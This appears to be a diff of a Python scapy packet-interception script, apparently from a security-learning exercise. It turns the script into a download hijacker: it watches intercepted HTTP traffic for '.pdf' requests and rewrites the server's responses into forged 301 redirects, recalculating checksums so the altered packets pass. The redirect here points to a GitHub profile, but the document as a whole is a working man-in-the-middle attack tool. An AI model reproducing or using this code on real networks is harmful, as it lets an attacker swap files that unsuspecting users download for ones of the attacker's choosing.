@@ -9,16 +9,23 @@ def print_and_accept(pkt):
     if scapy_packet.haslayer(scapy.Raw):
         try : 
             if scapy_packet[scapy.TCP].dport == 80:
-                print("HTTP request")
-                if "gzip" in str(scapy_packet[scapy.Raw].load) :
-                    print("[+] gzip request")
+                #print("HTTP request")
+                if ".pdf" in str(scapy_packet[scapy.Raw].load) :
+                    print("[+] .pdf request")
                     ack_list.append(scapy_packet[scapy.TCP].ack)
-                    print(scapy_packet.show())
+                    #print(scapy_packet.show())
             elif scapy_packet[scapy.TCP].sport ==80:
+                #print("HTTP response")
                 if scapy_packet[scapy.TCP].seq in ack_list:
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
-                    print("HTTP response")
-                    print(scapy_packet.show())
+                    print("[+] replacing file")
+                    str_load  = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.github.com/ouardaoui\n\n"
+                    scapy_packet[scapy.Raw].load = str_load
+                    del scapy_packet[scapy.IP].len
+                    del scapy_packet[scapy.IP].chksum
+                    del scapy_packet[scapy.TCP].chksum
+                    #print(scapy_packet.show())
+                    pkt.set_payload(bytes(scapy_packet))
         except IndexError : 
             pass
     pkt.accept()
